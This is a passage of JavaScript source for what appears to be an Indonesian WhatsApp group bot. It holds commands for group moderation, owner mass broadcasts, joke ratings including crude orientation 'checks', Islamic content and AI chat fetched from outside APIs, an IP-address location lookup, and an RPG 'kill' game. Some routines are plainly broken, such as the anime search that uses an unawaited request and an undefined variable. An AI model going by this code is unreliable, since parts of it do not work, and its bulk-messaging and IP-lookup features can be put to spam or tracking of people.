                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                conn.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: fkontak
                })
            }
            break
            
            case 'totag': {
               if (!m.isGroup) return newReply(mess.group)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
               if (!isAdmins) return newReply(mess.admin)
               if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
               conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
            case 'antilink': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilink) return newReply(`Sudah Aktif Sebelumnya!!️`)
                    db.data.chats[m.chat].antilink = true
                    newReply(`Antilink Group WhatsApp Aktif!!!️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilink) return newReply(`Sudah Nonaktif Sebelumnya!`)
                    db.data.chats[m.chat].antilink = false
                    newReply(`Antilink Group WhatsApp Nonaktif!️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antilinkv2':
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                if (args.length < 1) return newReply(`Example ${prefix + command} on/off`)
                if (q == 'on'){
                    global.db.data.chats[m.chat].antilinkv2 = true
                    newReply(`Berhasil Mengaktifkan antilinkv2`)
                } else if (q == 'off'){
                    global.db.data.chats[m.chat].antilinkv2 = false
                    newReply(`Berhasil Mematikan antilinkv2`)
                }
            break
            case 'antilinkyt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Aktif Sebelumnya`)
                    db.data.chats[m.chat].antilinkyt = true
                    newReply(`Antilink YouTube Aktif️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinkyt) return newReply(`Sudah Nonaktif Sebelumnya`)
                    db.data.chats[m.chat].antilinkyt = false
                    newReply(`Antilink YouTube Nonaktif️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antilinktt': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Saya Bukan Admin Kak`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilinktt) return newReply(`Sudah Aktif Sebelumnya`)
                    db.data.chats[m.chat].antilinktt = true
                    newReply(`Antilink TikTok Aktif`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilinktt) return newReply(`Sudah Nonaktif Sebelumnya`)
                    db.data.chats[m.chat].antilinktt = false
                    newReply(`Antilink TikTok Nonaktif️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break

            case 'banchat': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                    db.data.chats[m.chat].mute = true
                    newReply(`Bot Tidak Aktif Di Group Chat`)
   }
            break
            case 'unbanchat': {
                            if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                    db.data.chats[m.chat].mute = false
                    newReply(`Bot Aktif Kembali Di Group Chat`)
   }
   break
            case 'ephemeral': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Saya Bukan Admin Kak`)
                if (args[0] === '1') {
                    await conn.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await conn.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await conn.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await conn.groupToggleEphemeral(m.chat, 0).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else {
                let sections = [
                {
                title: "CHANGE EFFECTIVE GROUP",
                rows: [
                {title: "⌲ Ephemeral 1 day", rowId: `ephemeral 1`, description: `Activate the ephemeral group for 1 day`},
                {title: "⌲ Ephemeral 7 day's", rowId: `ephemeral 7`, description: `Activate the ephemeral group for 7 day's`},
                {title: "⌲ Ephemeral 90 days's", rowId: `ephemeral 90`, description: `Activate the ephemeral group for 90 day's`},
                {title: "⌲ Ephemeral Off", rowId: `ephemeral off`, description: `Deactivate this Ephemeral group`}
                ]
                },
                ]
                conn.sendListMsg(m.chat, `Please select the following Ephemeral Options List !`, ntiktok, `Hello Admin ${groupMetadata.subject}`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, m)
                }
            }
            break
                case 'bcgc': case 'bcgroup': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} Zzzzz`
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                      let txt = `${text}${readmore} ᴢʀ ʙʀᴏᴀᴅᴄᴀsᴛ ッ`
                    conn.sendMessage(i, {text: txt})
                }
                newReply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!text) return `Text mana?\n\nContoh : ${prefix + command} ZzzzzZ`
                let anu = await store.chats.all().map(v => v.id)
                newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		    for (let i of anu) {
		            await sleep(1500)
		            let txt = `${text}${readmore} ᴢʀ ʙʀᴏᴀᴅᴄᴀsᴛ ッ`
conn.sendMessage(i, {text: txt})
                }
		    newReply('Sukses Broadcast')
            }
            break
            case 'group':
            case 'grup': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(mess.botAdmin)
                if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => newReply(`Sukses Menutup Group 🕊️`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => newReply(`Sukses Membuka Group️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                  newReply(`Mode ${command}\n\n\nKetik ${prefix + command}open/close`)
                }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Saya Bukan Admin Kak`)
                if (args[0] === 'open') {
                    await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => newReply(`Sukses Membuka Edit Info Group`)).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'close') {
                    await conn.groupSettingUpdate(m.chat, 'locked').then((res) => newReply(`Sukses Menutup Edit Info Group️`)).catch((err) => newReply(jsonformat(err)))
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Saya Bukan Admin Kak`)
                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `${groupMetadata.subject}\n\n*Link:* https://chat.whatsapp.com/${response}`, m,  {
                    detectLink: true
                })
            }
            break
case 'cekid':
            case 'cekidgc': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Saya Bukan Admin Kak`)
                let response = await conn.groupInviteCode(m.chat)
                conn.sendText(m.chat, `${groupMetadata.id}`, m,  {
                    detectLink: true
                })
            }
            break            
            case 'revoke': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Saya Bukan Admin Kak`)
                await conn.groupRevokeInvite(m.chat)
                    .then(res => {
                        newReply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${groupMetadata.subject}`)
                    }).catch((err) => newReply(jsonformat(err)))
                    }
            break
            case 'listonline':
            case 'liston': {
                if (!m.isGroup) newReply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                conn.sendText(m.chat, '乂 List Online:\n\n' + online.map(v => '◦ @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
        // Fun Fitur 
        
            case 'apakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                newReply(`Rate : ${q}\nJawaban : *${te}%*`)
                }
            break
            
            case 'gantengcek':
            case 'cekganteng': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                newReply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                newReply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
                
            case 'kapankah': {
                if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
            
            case 'wangy': {
                if (!q) return newReply(`Contoh : .wangy Zaky`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                newReply(awikwok)
                }
            break
            
            case 'cekmati': {
                if (!q) return newReply(`Invalid!\n\nYg mau di cek siapa ??`)
                newReply(`*Error* Gw Males Benerin Fitur Ini`)
                }
            break
            
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return newReply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                newReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
            
        // ISLAMIN FITUR
            case 'iqra': {
                oh = `Contoh : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
                if (!text) return newReply(oh)
                yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
                conn.sendMessage(m.chat, {
                    document: yy,
                    mimetype: 'application/pdf',
                    fileName: `iqra${text}.pdf`
                }, {
                    quoted: m
                }).catch((err) => newReply(oh))
            }
            break
            case 'juzamma': {
                if (args[0] === 'pdf') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'
                        },
                        mimetype: 'application/pdf',
                        fileName: 'juz-amma-arab-latin-indonesia.pdf'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'docx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                        fileName: 'juz-amma-arab-latin-indonesia.docx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'pptx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileName: 'juz-amma-arab-latin-indonesia.pptx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'xlsx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                        fileName: 'juz-amma-arab-latin-indonesia.xlsx'
                    }, {
                        quoted: m
                    })
                } else {
                    newReply(`Mau format apa ? Contoh : ${prefix + command} pdf\nFormat yang tersedia : pdf, docx, pptx, xlsx`)
                }
            }
            break
            case 'hadis':
            case 'hadist': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 Arybotz || MultiDevice')
                if (!args[0]) return newReply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
                if (!args[1]) return `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
                try {
                    let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
                    let {
                        number,
                        arab,
                        id
                    } = res.find(v => v.number == args[1])
                    newReply(`No. ${number}

${arab}

${id}`)
                } catch (e) {
                    newReply(`Hadis tidak ditemukan !`)
                }
            }
            break
            case 'tafsirsurah': {
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!args[0]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                if (!args[1]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                newReply(txt)
            }
            break
            // Islami Fitur
            case 'asmaulhusna':
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=https://telegra.ph/file/2612f903ab41b79bef7e3.jpg`)
				.then(({ data }) => {
					var text = `No : ${data.result.index}\n`
					text += `Latin: ${data.result.latin}\n`
					text += `Arab : ${data.result.ar}\n`
					text += `Indonesia : ${data.result.id}\n`
					text += `English : ${data.result.en}`
					newReply(text)
				})
				.catch(console.error)
			break
			
			case 'alquranaudio': {
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (args.length == 0) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                newReply(mess.wait)
                conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${full_args}?apikey=${apilol}`}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            break
            
            case 'alquran':
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length < 1) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apilol}`)
				.then(({ data }) => {
					var ayat = data.result.ayat
					var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
					for (var x of ayat) {
						text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
					}
					text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
					text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
					newReply(text)
				})
				.catch(console.error)
            break
case 'animesearch': case 'animes': {
if (!text) return reply(`Masukan Query!`)
let anims = axios.get(`https://api.lolhuman.xyz/api/anime?apikey=${apilol}&query=${text}`)
let caption = `*ANIME SEARCH*
TitleID: ${anims.result.title.romaji}
Format: ${anims.format}
Eps: ${anims.episodes}
Status: ${anims.status}
Season: ${anims.season}
Source: ${anims.source}
Genres: ${anims.genres[0]}
Deskripsi: ${anims.description}`
conn.sendMessage(m.chat, { image: { url: coverimage.medium }, caption: caption })
}
break
			case 'jadwalsolat': case 'jadwalsholat': {
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            if (!text) return newReply('Mana Kotanya?')
            newReply(mess.wait)
            let anu = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${text}?apikey=${apilol}`)
            newReply(`Wilayah: ${anu.result.wilayah}\n\nTanggal: ${anu.result.tanggal}\nSahur: ${anu.result.sahur}\nImsak: ${anu.result.imsak}\nTerbit: ${anu.result.terbit}\nDhuha: ${anu.result.dhuha}\nDzuhur: ${anu.result.dzuhur}\nAshar: ${anu.result.ashar}\nMagrib: ${anu.result.maghrib}\nIsya: ${anu.result.isya}`)
            }
            break
            
            case 'kisahnabi':
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			if (args.length == 0) return newReply(`Example: ${prefix + command} Muhammad`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/kisahnabi/${full_args}?apikey=${apilol}`)
				.then(({ data }) => {
					var text = `Name : ${data.result.name}\n`
					text += `Lahir : ${data.result.thn_kelahiran}\n`
					text += `Umur : ${data.result.age}\n`
					text += `Tempat : ${data.result.place}\n`
					text += `Story : \n${data.result.story}`
					newReply(text)
				})
				.catch(console.error)
			break
			
            case 'listsurah':
            if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran?apikey=${apilol}`)
				.then(({ data }) => {
					var text = 'List Surah:\n'
					for (var x in data.result) {
						text += `${x}. ${data.result[x]}\n`
					}
					newReply(text)
				})
				.catch(console.error)
			break
			case 'quoteislami': case 'quoteislam': {
			   if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			         let anu = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${apilol}`)
			         newReply(`${anu.result}`)
			         }
break
			case 'pantun': case 'pantun dong': {
			if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
			         let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/pantun?apikey=${apilol}`)
			         newReply(`${anu.result}`)
			         }
break
case 'fanartanim': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/art?apikey=${apilol}`}, caption: `Done?`}, {quoted: m})
}
break
case 'quoteimg': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                newReply(mess.wait)
                conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/quotesimage?apikey=${apilol}`}, caption: `Random Quotes`}, {quoted: m})
}
break
case 'simi': case 'simisimi': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Halo Simi`)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${apilol}&text=${q}`)
newReply(`${anu.result}`)
}
break
case 'ff': case 'ffstalk': {
if (!q) return newReply(`Example : ${command} (id)`)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${q}?apikey=${apilol}`)
newReply(`*Name:* ${anu.result}`)
}
break
case 'ipstalk': case 'alamatip': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!q) return newReply(`Example: ${command} (ip address)`)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/ipaddress/${q}?apikey=${apilol}`)
newReply(`*country:* ${anu.result.country}\n*countryCode:* ${anu.result.countryCode}\n*regionName:* ${anu.result.regionName}\n*city:* ${anu.result.city}\n*timezone:* ${anu.result.timezone}\n*isp:* ${anu.result.isp}`)
}
break
case 'quoteanim': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${apilol}`)
newReply(`*Character:* ${anu.result.character}\n*Anime:* ${anu.result.anime}\n*Eps:* ${anu.result.episode}\n\n*Quotes:* ${anu.result.quote}`)
}
break
case 'chatgpt': case 'ai': case 'openai': {
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
/* New Line */
let system = `Nama Kamu Adalah Arybotz-Ai, Kamu Adalah Asistem Profesional, Kamu Pintar Dan Cerdas Dan Juga Asik, Sapa Orang Lain Dengan Nama User/Pengguna, Dan Pembuatmu Adalah Aryjuanda, Buat Emosi Mu Dengan Emoji, Dan Kamu Seorang Yang Asik,Lucu,Cerdas, dan Kamu Berbahasa Indonesia`
  const response = await axios.get(`https://api.lolhuman.xyz/api/openai-turbo?apikey=${apilol}&text=${text}&system=${system}`)
  const data = response.data;
  if (data.status === 200 && data.message === 'success') {
    const result = data.result;
    reply(result)
  } else {
    reply('Gagal mendapatkan data dari API.');
  }
}
break
case 'membunuh': case 'bunuh': {
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
let monaynye = Math.ceil(Math.random() * 2000)
let darahnye = Math.ceil(Math.random() * 30)
let time = global.db.data.users[m.sender].bunuh + 20000
 if (new Date - global.db.data.users[m.sender].bunuh < 20000) return newReply(`Kamu Masih Dicari Oleh Polisi, Jangan Ngebunuh Orang Dulu!`)
let who = m.mentionedJid[0]
if (!who) return reply(`Tag User Yang Mau Di Bunuh!`)
let caption = `@${who.split('@')[0]} Terbaring Lemah Karna Kamu Tendang Dia Sampe Terjungkal 😪\n
ᴋᴀᴍᴜ ᴍᴇɴɢᴀᴍʙɪʟ ᴜᴀɴɢ ᴅɪᴀ ʙᴇʀᴊᴜᴍʟᴀʜ ${monaynye}
darah @${who.split('@')[0]} Berkurang -${darahnye}`
conn.sendMessage(m.chat, {
						  text: caption,
						  contextInfo: {
							mentionedJid: [who],
							externalAdReply: {
							  title: `ArybotzMultiDevice`,
							  thumbnailUrl: thurl,
							  sourceUrl: sig,
							  mediaType: 1,
							  renderLargerThumbnail: true
							}
						  }
						});
db.data.users[m.sender].money += monaynye
db.data.users[who].money -= monaynye
kurangDarah(who, darahnye)
